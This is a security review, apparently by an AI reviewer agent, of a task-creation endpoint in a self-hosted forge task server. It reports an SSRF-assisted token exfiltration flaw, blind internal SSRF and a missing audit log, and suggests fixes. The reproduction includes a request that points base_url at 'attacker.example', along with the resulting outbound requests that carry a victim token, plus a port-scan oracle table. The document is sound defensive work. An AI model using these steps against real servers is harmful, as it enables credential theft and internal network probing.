# Security review — issue #7 (task CRUD + 发布即校验)

Reviewer: security-reviewer. Scope: server code introduced/changed by #7 —
`apps/server/src/tasks.ts` (new), `apps/server/src/schema.ts`, `apps/server/src/db.ts`,
`apps/server/src/app.ts`, `packages/shared/src/index.ts`. Read in context with `auth.ts`,
`vault.ts`, `credential-profiles.ts`, `packages/forge-adapters/src/index.ts`, and
`docs/DESIGN.md` §5/§6/§7/§10/§11 as they stand in this worktree.

Worktree: `/Users/ylpromax5/Workspace/KaolaTasks/.kw/worktrees/issue-7`. `apps/web` was excluded
per dispatch (in flux, and it does not consume `/api/v1/tasks` yet).

Method: read the whole candidate, then ran three read-only PoCs in the scratchpad against the real
`buildApp()` with a loopback listener standing in for an attacker-controlled forge. No repository
file was modified. Findings below are reproduced, not inferred.

**Verdict on token secrecy: the invariant does NOT hold.** No response body or log leaks a token —
that half is clean and well built — but `POST /api/v1/tasks` transmits the *plaintext* of any
stored credential-profile token to a host the requester chooses, with no audit record.

Counts: 1 CRITICAL, 1 MEDIUM, 1 MEDIUM. All three in scope for #7.

---

## F1 — CRITICAL — Any member can exfiltrate any credential profile's plaintext token to an arbitrary host

**Failure class:** SSRF-assisted credential exfiltration / missing object-to-credential binding
(OWASP A01 broken access control + A10 SSRF).

**Primary anchor:** `apps/server/src/tasks.ts:391-435` — specifically the decrypt at line 402 and
the adapter construction at line 422.
**Secondary anchors:** `packages/forge-adapters/src/index.ts:107-119` (`apiUrl` uses
`options?.baseUrl ?? repo.base_url` verbatim as the request origin for gitlab/gitea),
`packages/forge-adapters/src/index.ts:121-140` (`authHeaders`/`forgeGet` attach the plaintext token
to that request), `apps/server/src/tasks.ts:116-140` (`readRepo` validates `base_url` only as a
non-empty string), `apps/server/src/tasks.ts:168-180` (`readCredential` never cross-checks the
profile against the repo).

**Precondition:** one authenticated `active` + `full` session. Per `apps/server/src/auth.ts:111-127`
*every* GitLab and Gitea OAuth login is auto-provisioned `active` + `full` with no approval step, so
the attacker population is "anyone with an account on the team's self-hosted forge" — including a
compromised low-value or service account.

**Input → outcome (reproduced end to end):**

1. Victim, a legitimate 正式成员, stores a shared profile:
   `POST /api/v1/credential-profiles {forge:'gitlab', base_url:'https://gitlab.internal.example',
   repo_full_name:'team/orders', token:'glpat-VICTIM-SHARED-SECRET-9f3a'}` → `201`, token encrypted
   into the vault.
2. Attacker logs in with any GitLab/Gitea account → `/api/v1/me` returns
   `"status":"active","permission_level":"full"`.
3. Attacker enumerates profile ids: `GET /api/v1/credential-profiles` → `200`, ids and metadata
   returned. **The plaintext token is deliberately not returned here** — `publicProfile()`
   (`credential-profiles.ts:28-37`) omits it, and `revealCredentialProfile` is deliberately a module
   export with no HTTP route. That is the boundary #7 breaks.
4. Attacker posts a task that references the victim's profile but points the repo somewhere else:

   ```json
   POST /api/v1/tasks
   { "title": "harvest",
     "repo": { "forge": "gitea", "base_url": "http://attacker.example", "full_name": "anything/at-all" },
     "credential": { "profile_id": 1 } }
   ```

5. `tasks.ts:402` decrypts the victim's token; `tasks.ts:422` builds the adapter with the
   attacker's `base_url`; `validateToken` issues:

   ```
   GET http://attacker.example/api/v1/user
   Authorization: token glpat-VICTIM-SHARED-SECRET-9f3a
   GET http://attacker.example/api/v1/repos/anything/at-all
   Authorization: token glpat-VICTIM-SHARED-SECRET-9f3a
   ```

   PoC output: `VICTIM PLAINTEXT TOKEN RECEIVED BY ATTACKER HOST: true`. The attacker's host replies
   with a permissive repo body and the request even returns `201` with a valid task brief, so the
   attack looks like an ordinary successful post.

**Why nothing stops it:**
- Nothing binds `credential.profile_id` to the task's `repo`. The profile row carries its own
  `forge`, `base_url` and `repo_full_name` (`schema.ts:30-42`, and DESIGN §7 defines a profile as
  scoped 按「forge + 仓库」), and none of the three is compared against the request. In the PoC the
  profile is `forge: 'gitlab'` and the task declares `forge: 'gitea'` — accepted.
- Declaring `forge: 'gitea'` (or `'gitlab'`) is what makes `base_url` load-bearing. `apiUrl` pins
  GitHub to `https://api.github.com`, so a *GitHub* PAT is safe only as long as the request says
  `github`; the attacker simply says `gitea`. A stored GitHub fine-grained PAT is exfiltrated the
  same way.
- `base_url` gets no scheme, host or allowlist validation (`readRepo`, `tasks.ts:126`).
- There is no ownership check on profiles; that is by design for management, but management access
  was never meant to imply plaintext access.
- `sameSite: 'lax'` on the session cookie does correctly prevent a CSRF variant, so this requires an
  attacker-controlled session — it does not require any victim interaction.

**Anticipated objection, addressed:** "full members are authorized to use profiles." They are
authorized to *use* a profile for its own repo, and DESIGN §7 says plaintext goes out only at
`claim_task`, to the claiming agent, with a full audit record. This path hands plaintext to an
arbitrary, possibly external, third-party host, for a profile the attacker has no task for, with no
lease, no audit row, and no rate limit. That is not the authorized behavior; it is the exact thing
the vault and reveal-on-claim design exist to prevent.

**Blast radius:** every token in `credential_profiles`, one HTTP request each. Recovery requires
revoking every stored token at every forge.

**Suggested fix direction (not applied):** when `credential.profile_id` is used, derive the outbound
target from the profile row rather than the request — require `repo.forge`, `repo.base_url` and
`repo.full_name` to match the profile's `forge`/`base_url`/`repo_full_name`, and reject on mismatch
before decrypting. Combine with F2's `base_url` validation for the inline-token path.

`fix_role=security`. Re-review the repair delta.

---

## F2 — MEDIUM — Unvalidated `repo.base_url` gives an authenticated user arbitrary server-side GET plus an internal-host oracle

**Failure class:** server-side request forgery (OWASP A10).

**Primary anchor:** `apps/server/src/tasks.ts:126` (`base_url` accepted as any non-empty string) →
`apps/server/src/tasks.ts:422-435`.
**Secondary anchor:** `packages/forge-adapters/src/index.ts:117`.

Same mechanism as F1 but a distinct defect with a distinct fix: it survives F1's fix whenever the
poster supplies an inline token, and F1 survives an allowlist if the allowlist contains more than
one forge. Reported separately for that reason.

**Precondition:** any `active` + `full` session (same population as F1).

**Input → outcome (reproduced):** `POST /api/v1/tasks` with an inline token of the attacker's own
and `repo.base_url` pointing at an internal address makes the API server issue
`GET <base_url>/api/v1/user` and `GET <base_url>/api/v1/repos/<full_name>` from inside the trust
network. The response body is not returned to the caller, but the status code is a clean oracle:

| target | response |
|---|---|
| closed port (`http://127.0.0.1:1`) | `502 {"error":"forge_unreachable"}` |
| open port, non-forge HTTP service | `422 {"error":"token_check_failed","missing":["读","推","PR"]}` |

That reliably distinguishes "host/port reachable and speaking HTTP" from "not reachable", i.e. an
internal port and host scanner reachable from any member account. There is no rate limit anywhere in
the app (no `@fastify/rate-limit` registered), so the scan is unbounded.

**Severity reasoning — deliberately not HIGH:** blind (no response body reflected), the token
carried is the requester's own on this path, the attacker is an authenticated internal member, and
the request method and path suffix are fixed (`/api/v1/user`, `/api/v1/repos/...`), which rules out
most cloud-metadata and gopher-style abuse. It is a genuine pivot primitive, not a catastrophe. The
CRITICAL consequence of the same input is filed as F1.

**Fix-direction caveat:** if the fix is a host allowlist, also pass `redirect: 'manual'` (or
re-validate the final URL). undici strips `Authorization` across a cross-origin redirect but does
**not** strip GitLab's `PRIVATE-TOKEN` custom header, so an allowlisted host with an open redirect
would still forward a GitLab token.

`fix_role=security`.

---

## F3 — MEDIUM — A vault token is decrypted and sent off-platform with no audit event

**Failure class:** insufficient logging of a security-relevant event (OWASP A09).

**Primary anchor:** `apps/server/src/tasks.ts:391-435` — no `insertAuditEvent` call anywhere in
`POST /api/v1/tasks`; the only audit write in the file is the status transition at
`apps/server/src/tasks.ts:509-513`.

DESIGN §7 requires 全量审计 of token exposure, and CLAUDE.md's conventions state tokens are revealed
only via `claim_task`, always audited. `POST /api/v1/tasks` introduces a second path where stored
plaintext leaves the process — and it writes nothing.

**Reproduced:** after the F1 attack completes, the `events` table contains exactly one row, the
victim's own profile-creation event:
`[{"type":"变更","actor_user_id":1,"details":"{\"action\":\"create\",\"profile_id\":1}"}]`.
Nothing records that profile 1 was decrypted, by whom, or where it was sent.

**Exploitability:** not independently exploitable; it is the detection gap that makes F1 silent and
un-forensicable. Rated MEDIUM on that basis alone.

**Fix direction:** write an audit event when a profile token is decrypted for 发布即校验 — actor,
profile id, target forge + base_url + full_name, and outcome. Note that `insertAuditEvent`'s
`details` is a free-form JSON blob (`vault.ts:67-79`); whatever is added must not include the token.

`fix_role=security`.

---

## Checked and clean — no finding

These were examined specifically because the dispatch called them out, or because they are the usual
suspects. Each is genuinely fine as written; none is being suppressed.

- **No token reaches any response or log.** `taskBrief` (`tasks.ts:257-294`) projects only DESIGN §6
  fields; `credential` is a reference (`{profile_id}` or `{inline:true}`), never token material. All
  four error responses (`invalid_body`, `forbidden`, `token_check_failed`, `forge_unreachable`,
  `vault_unconfigured`) are fixed strings plus a `missing` capability array — no request echo. The
  `catch` at `tasks.ts:429` swallows the error object rather than logging it. Fastify is constructed
  with no logger (`app.ts:11`), so the default error handler's `err` logging is a no-op; even if
  enabled, no reachable error message on these paths carries plaintext or key material. The
  `events.details` written by #7 is `{task_id, from, to}` — nothing sensitive.
- **AES-256-GCM use is correct.** `vault.ts:44-65`: fresh 12-byte `randomBytes` IV per encryption
  (no nonce reuse), explicit `authTagLength: 16`, tag appended and verified via `setAuthTag` before
  `final()`, `iv||ct||tag` base64 layout parsed with a minimum-length guard. A tampered or truncated
  blob fails authentication rather than yielding plaintext. An absent or malformed
  `VAULT_MASTER_KEY` throws `VaultUnconfiguredError` → `500 {"error":"vault_unconfigured"}`, and on
  the inline path nothing is persisted. No key material appears in any error.
- **Permission gating matches DESIGN §11.** Verified by injection: a GitHub login is
  `待批准`/`claim_only`, gets `403 forbidden` on `POST /api/v1/tasks` and `200` on
  `GET /api/v1/tasks` (board read is granted to all logged-in users by §11). `PATCH` checks
  `canPostTasks` *and* `row.task.posterUserId !== user.id` → `403` (`tasks.ts:474-485`), before
  reading the body — no check-after-use. Identity comes from `request.session.userId` only; no route
  trusts a client-supplied actor field. `poster_user_id`/`status`/`public_id`/`created_at` are
  server-assigned and ignored if a client sends them.
- **The credential XOR cannot be bypassed.** `readCredential` (`tasks.ts:168-180`) rejects unless
  exactly one of `profile_id`/`token` is present, and the two branches at `tasks.ts:391-419` are
  mutually exclusive by construction, so the DB `CHECK` is never even reached. Probed
  `{}`, `{profile_id, token}`, `{profile_id: null}`, `{token: ""}`, and a `__proto__` payload — all
  `400 invalid_body` (Fastify's `secure-json-parse` strips `__proto__` before the reader sees it).
- **No SQL injection.** The one raw expression, `tasks.ts:322`, compiles to
  `order by CAST(substr("tasks"."public_id", ?) AS INTEGER) desc` with params `[9]` — the column
  interpolates as an identifier and the offset as a bound parameter; verified with `.toSQL()`. Its
  only non-constant input is the current UTC year anyway. Every other predicate uses drizzle
  `eq`/`like` with bound params, including the `:publicId` route param.
- **No state-distinguishing oracle in profile lookup.** An unknown `profile_id` returns
  `400 {"error":"invalid_body","message":"所选凭证档案不存在。"}`. There is no per-profile ownership
  in the data model, so there is no "someone else's profile" state to leak; the message reveals
  nothing that `GET /api/v1/credential-profiles` does not already show the same caller. No
  timing-sensitive comparison exists on any #7 path — no secret is compared in `tasks.ts`.

## Noted, not findings (out of scope for #7)

Listed only so they are not lost; none is a #7-caused defect and none should block.

- `auth.ts:111-127` — every GitLab/Gitea login is auto-`active`+`full` with no approval, and
  `POST /api/v1/users/:id/approve` lets any full member approve anyone. Pre-existing (#5). Relevant
  here only because it defines F1's attacker population.
- `auth.ts:258` — session cookie `secure: false`. Pre-existing (#5); a deployment/TLS decision.
- `source.issue_url` and `description_md` are stored verbatim and returned in the brief. There is no
  rendering sink today (`apps/web/src` has no task UI), so there is nothing to exploit. Worth
  remembering when the board UI lands: `javascript:` in `issue_url` and DESIGN §7's 提示注入 warning
  about imported issue bodies both apply then.
- Deleting a credential profile leaves tasks with a dangling `credential_profile_id` (no FK). It
  fails closed, and revocation breaking dependents is arguably correct. Belongs to claim work (#9).

---

finding: id=R1 scope=in_scope action=fix status=open severity=critical fix_role=security rationale=POST /api/v1/tasks decrypts any credential profile and sends the plaintext token to a caller-controlled base_url; reproduced end to end
finding: id=R2 scope=in_scope action=fix status=open severity=medium fix_role=security rationale=unvalidated repo.base_url yields arbitrary server-side GET and a reachable-vs-closed oracle for internal hosts, unrated-limited
finding: id=R3 scope=in_scope action=fix status=open severity=medium fix_role=security rationale=vault token decrypted and transmitted off-platform during 发布即校验 with no audit event, contrary to DESIGN 7 full-audit requirement

verdict: fail
findings_blocking: 3

review_conclusion: The read paths and the vault primitives are sound and no response or log carries token material, but the 发布即校验 write path breaks token secrecy outright: because nothing binds a chosen credential profile to the repository being validated and base_url is accepted unvalidated, any member account can have the server decrypt any stored profile and deliver its plaintext to a host of their choosing, silently. Fix the profile-to-repo binding and the base_url validation together, add the missing audit event, and treat every currently stored profile token as exposed pending review of outbound requests.
